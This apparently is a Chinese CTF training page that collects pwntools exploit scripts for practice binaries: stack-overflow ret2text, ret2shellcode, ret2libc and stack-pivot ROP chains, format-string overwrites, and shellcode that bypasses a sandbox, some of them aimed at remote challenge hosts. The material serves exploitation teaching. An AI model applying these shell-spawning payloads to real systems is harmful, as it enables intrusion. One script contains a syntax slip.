---
sidebar_label: '练习题'
sidebar_position: 5
---

# 栈溢出

## ret2text

### ret2text0_x32

:star2:exp:

```
from pwn import *
context(os="linux",arch="i386",log_level="debug")
elf = ELF("ezr0p")
io = process("ezr0p")
sys_adr = elf.symbols["system"]
shell_adr = 0x804A080
callsys = 0x8048562
print("sys_adr -------> "+ hex(sys_adr))
# payload = b's' * (28+4) + p32(sys_adr) + p32(0)+ p32(shell_adr)
payload = b's' * (28+4) + p32(callsys)+ p32(shell_adr)
io.recvuntil(b"please tell me your name")
io.send(b"/bin/sh")
io.recvuntil(b"now it's your play time~")
io.send(payload)
io.interactive()
```

### ret2text1

若本地环境大于Ubuntu18，则需要使用clibc去将程序的glibc版本修改到旧版本，否则无法成功利用漏洞。

#### pwninit

确保pwninit、题目文件和libc文件在同一目录下（也可以将pwninit配置为环境变量）：

```bash
pwninit
```

之后会在本地生产修改libc的版本以及一个exp模板。

#### clibc

[下载链接](https://github.com/tower111/pwn-change-libc)

```bash
git clone https://github.com/tower111/pwn-change-libc
cd pwn-change-libc
```

将此项目下update_list文件第一行的python改为python3

```bash
python3 get_env.py
sudo ln -s <clibc的绝对路径> /usr/bin/clibc
```

使用方法：

```bash
#clibc 目标文件 目标版本
clibc pwn 2.21
```

```bash
#将glibc版本改为旧版本
clibc pwn 2.23
```

简单版本exp：

```python
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
elf = ELF("./pwn") #使用ELF函数去解析目标文件，存储为elf对象
io = process("./pwn_new") #启动一个进程，命名为io
io.recvuntil(b"do you know ret2text?\n") #一直接收数据，直到接收到指定数据
back_door = 0x401235 #ida查找后门地址
payload = b's'*0x58 + p64(back_door) #填充正常空间+rbp + 恶意地址
io.sendline(payload) #发送payloa
io.interactive() #进行交互
```

:star2:高级手动构造rop的exp:

查询poprdi地址：

```
ROPgadget --binary ./pwn --only "pop|ret"
```

```python
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
elf = ELF("./pwn") #使用ELF函数去解析目标文件，存储为elf对象
io = process("./pwn") #启动一个进程，命名为io

io.recvuntil(b"do you know ret2text?\n") #一直接收数据，直到接收到指定数据
gdb.attach(io)
back_door = 0x401235 #ida查找后门地址
ret = 0x40101a #ROPgadget --binary ./pwn --only"pop|ret"
# payload = b's'*0x58 + p64(ret) + p64(back_door) #填充正常空间+rbp + 恶意地址4
#ROPgadget --binary ./pwn --only "pop|ret"
pop_rdi_ret =0x4012c3
shell_adr = 0x40201A #ida查询
sys_adr = elf.symbols['system']

pause()
payload = b's'*0x58 + p64(pop_rdi_ret) + p64(shell_adr) + p64(sys_adr)
io.sendline(payload) #发生payloa
io.interactive() #进行交互
```

新版添加了栈对齐校验也有办法绕过，添加一个ret指令即可：

使用ROPgadget查询ret指令：

```bash
ROPgadget --binary ./pwn --only "pop|ret"
```

![image-20240522173002990](http://image.shangu127.top/img/2024/03/image-20240522173002990.png)

此脚本可以在高版本linux中成功利用漏洞：

```python
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
elf = ELF("./pwn") #使用ELF函数去解析目标文件，存储为elf对象
io = process("./pwn") #启动一个进程，命名为io
io.recvuntil(b"do you know ret2text?\n") #一直接收数据，直到接收到指定数据
back_door = 0x401235 #ida查找后门地址
ret = 0x40101a #ROPgadget --binary ./pwn --only "pop|ret"
payload = b's'*0x58 + p64(ret) + p64(back_door) #填充正常空间+rbp + 恶意地址
io.sendline(payload) #发生payloa
io.interactive() #进行交互
```



### ret2text2

:star2:exp:

```python
from pwn import *
from LibcSearcher import*
import sys
remote_addr = ["49.233.15.226",8003]
#libc=ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("")
    context(arch='', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

pop_rdi = 0x4012c3
bin_sh = 0x404048
system_addr = 0x401254

payload = b'a' (0xa0 + 0x8) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)
sl(payload)

shell()
```

### ret2text3

:star2:exp:

```python
from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["gxh191.top",25534]
#libc=ELF('')
elf = ELF('./pwn3_2')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pwn3_2")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

#gdb.attach(p)
system_plt = p64(elf.plt['system'])
pop_rdi = p64(0x4012c3)
binsh = p64(0x404090)
ret = p64(0x40101a)

ru(b':\n')
payload = b'/bin/sh\x00'
s(payload)
ru(b'something: ')
payload = b'a' * (0x10 + 8) + ret + pop_rdi + binsh + system_plt
s(payload)

shell()
```

## ret2shellcode

### inny_rop

静态链接题目，可以使用ropchain自动生成shellcode

![image-20240523163431554](http://image.shangu127.top/img/2024/03/image-20240523163431554.png)

```
ROPgadget --binary ./rop --ropchain
```

```python
from pwn import *
from struct import pack
context(os='linux',arch='i386',log_level='debug')
#ROPgadget --binary ./rop --ropchain
# io = remote("node5.buuoj.cn",25379)
io = process("./pwn")
p = b's'* 16
p += pack(b'<I', 0x0806ecda) # pop edx ; ret
p += pack(b'<I', 0x080ea060) # @ .data
p += pack(b'<I', 0x080b8016) # pop eax ; ret
p += b'/bin'
p += pack(b'<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
p += pack(b'<I', 0x0806ecda) # pop edx ; ret
p += pack(b'<I', 0x080ea064) # @ .data + 4
p += pack(b'<I', 0x080b8016) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ecda) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x080492d3) # xor eax, eax ; ret
p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080de769) # pop ecx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x0806ecda) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x080492d3) # xor eax, eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0806c943) # int 0x80

io.sendline(p)
io.interactive()
```



### ezshellcode

:star2:exp:

```
from pwn import *
context(os='linux',arch='i386',log_level='debug')
elf = ELF("./pwn")
# io = remote("node4.buuoj.cn",26890)
io= process("./pwn")
io.recvuntil(b"What's this:")
shell_adr = int(io.recv(10)[2:],16)
print(hex(shell_adr))
shellcode = asm(shellcraft.sh())
payload = shellcode
payload = payload.ljust(140,b's')
payload += p32(shell_adr)
io.sendline(payload)
io.interactive()
```

:star:ret2libc打法：

```
from pwn import *
import sgtlibc
context(os='linux',arch='i386',log_level='debug')
elf = ELF("./pwn")
io = remote("node4.buuoj.cn",26890)

write_plt = elf.plt['write']
write_got = elf.got['write']
main_adr = 0x804847B
payload = b's'*140 + p32(write_plt) + p32(main_adr) + p32(1) + p32(write_got) + p32(4)
io.sendline(payload)
write_adr = u32(io.recv(4))
libc = sgtlibc.Searcher("write",write_adr)
system_adr = libc.get_address(sgtlibc.s_system)
shell_adr = libc.get_address(sgtlibc.s_binsh)
payload2 = b's'*140 + p32(system_adr) + p32(0) + p32(shell_adr)
io.sendline(payload2)
io.interactive()
```

## ret2syscall

## ret2libc

#### patchlibc

将libc修改为旧版本并且复制libc到本目录，方便脚本查找函数

```bash
clibc pwn 2.23
ldd pwn
cp /glibc/2.23/64/lib/libc.so.6 ./libc.so.6
```

程序system，静态的system与静态的puts的偏移量。

puts加载后再got表的地址（libc中的puts记载到内存的位置），

加载到内存产生的偏移量 = 加载后got地址 - 加载前libc内静态地址

**system动态可调用地址 = 加载内存的偏移量 + 静态的system地址**

puts_adr

system_adr

puts_got

iv = puts_got - puts_adr

system = iv + system_adr

write(write_got)

#### 动调计算偏移

```
cyclic 200
cyclic -l esp寄存器内的操作数
```

![image-20240523142332619](http://image.shangu127.top/img/2024/03/image-20240523142332619.png)

#### 构造泄露gotpayload

![image-20240523142600746](http://image.shangu127.top/img/2024/03/image-20240523142600746.png)

```
ROPgadget --binary ./pwn --only "pop|ret"
0x00000000004006b3 : pop rdi ; ret
0x00000000004006b1 : pop rsi ; pop r15 ; ret
```

exp:

```python
from pwn import *
import pdb
context(os='linux',arch='amd64',log_level='debug')
elf = ELF("./pwn")
libc = ELF("./libc.so.6")
io = process("./pwn")
write_adr = libc.symbols['write'] #获取静态write地址
system_adr = libc.symbols['system'] #获取静态system地址
main_adr = elf.symbols["main"]
shell_adr = libc.search(b"/bin/sh").__next__()
# pdb.set_trace()
write_got = elf.got["write"]
write_plt = elf.plt["write"]
#write_plt(1,write_got,100)
# ROPgadget --binary ./pwn --only "pop|ret"
# 0x00000000004006b3 : pop rdi ; ret
# 0x00000000004006b1 : pop rsi ; pop r15 ; ret
pop_rdi = 0x4006b3
pop_rsi_r15 = 0x4006b1
payload1 = b's'*136 + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(write_got) + p64(0) + p64(write_plt) + p64(main_adr)

io.recvuntil(b":")
# gdb.attach(io)

# pause()
io.sendline(payload1)
io.recvline()
write_call = u64(io.recv(6).ljust(8,b"\x00")) #接受6个数据，并按照8个一组进行填充，最后解包

print(hex(write_call))
#计算偏移和加载地址
iv = write_call - write_adr
sys_call = iv + system_adr
shell_call = shell_adr + iv
payload2 = b's'*136 + p64(pop_rdi) + p64(shell_call) + p64(sys_call)

io.recvuntil(b":")
io.sendline(payload2)
io.interactive()
```

#### 无libc文件的ret2libc

```python
from pwn import *
import pdb
import sgtlibc
context(os='linux',arch='amd64',log_level='debug')
elf = ELF("./pwn")
io = process("./pwn")
main_adr = elf.symbols["main"]
write_got = elf.got["write"]
write_plt = elf.plt["write"]
pop_rdi = 0x4006b3
pop_rsi_r15 = 0x4006b1
payload1 = b's'*136 + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(write_got) + p64(0) + p64(write_plt) + p64(main_adr)

io.recvuntil(b":")
io.sendline(payload1)
io.recvline()
write_call = u64(io.recv(6).ljust(8,b"\x00")) #接受6个数据，并按照8个一组进行填充，最后解包

print(hex(write_call))
libc = sgtlibc.Searcher()   #定义查找对象
libc.add_condition('write', write_call) #添加查找条件
libc.dump(db_index=2) #从0开始尝试所有版本
shell_call = libc.get_address(sgtlibc.s_binsh) #自动计算地址
sys_call = libc.get_address(sgtlibc.s_system) #自动计算地址
payload2 = b's'*136 + p64(pop_rdi) + p64(shell_call) + p64(sys_call)

io.recvuntil(b":")
io.sendline(payload2)
io.interactive()
```



## ORW

## stack_pivot

:star2:exp:

```
from pwn import *
import sgtlibc
context(os="linux",arch='amd64',log_level='debug')
elf=ELF("pwn")
io=process("./pwn")

read_adr = 0x4011FD
addr1 = 0x404858
payload1 = b's'*80 + p64(addr1) + p64(read_adr)
io.sendlineafter(b"do you know stack pivoting?",payload1)
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
pop_rdi = 0x401283
leave_ret = 0x40121d
payload2 = p64(0x404808)+p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(read_adr)
payload2 = payload2.ljust(80,b'\x00') + p64(0x404808) + p64(leave_ret)
io.send(payload2)
puts_adr = u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
print("puts_adr -----> "+hex(puts_adr))
libc = sgtlibc.Searcher()
libc.add_condition("puts",puts_adr)
libc.dump(db_index=2)
system_adr = libc.get_address(sgtlibc.s_system)
shell_adr = libc.get_address(sgtlibc.s_binsh)
# gdb.attach(io)
# pause()
payload3 = p64(0) + p64(pop_rdi) + p64(shell_adr) + p64(system_adr)
payload3 = payload3.ljust(80,b"\x00") + p64(0x4047b8) + p64(leave_ret)
io.send(payload3)

io.interactive()
```



# 格式化字符串

## fmt2_x64

:star:exp:

```python
from pwn import *
import sgtlibc
p = process("./fmt2_x64")

p.sendafter(b">>>\n", "%39$p")
libc = int(p.recv(14).decode("utf-8"), 16) - 0x21c87
print(hex(libc))
one = libc + 0x4f420
context.arch = 'amd64'
success(hex(one))
payload = fmtstr_payload(6, {0x601028:p64(one)})
p.sendline(payload)

p.interactive()
```

## fmt3_x64

```python
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
io = process("./fmt3_x64")
payload = fmtstr_payload(6,{0x6009b8:0x4006f8})
print(payload)
io.recvuntil(b">>>")
gdb.attach(io)
pause()
io.sendline(payload)
io.interactive()
```



# 保护绕过

## canary

## PIE

## sandbox

### shellcode

:star:exp:

```python
from pwn import *
context(os='linux',arch="amd64",log_level='debug')
elf = ELF("./shellcode")
shangu = 0
io = process("./shellcode")

shellcode = asm(shellcraft.cat('flag'))
shellcode2 = asm('''
sub rsp,0x30
call rsp
''')
print(shellcode)
shellcode=shellcode.ljust(0x28,b"\x00")

jmp_jsp = 0x400785
payload = shellcode + p64(jmp_jsp) + shellcode2
gdb.attach(io)
pause()
io.sendafter(b"Can u pwn me?",payload)
io.interactive()
```

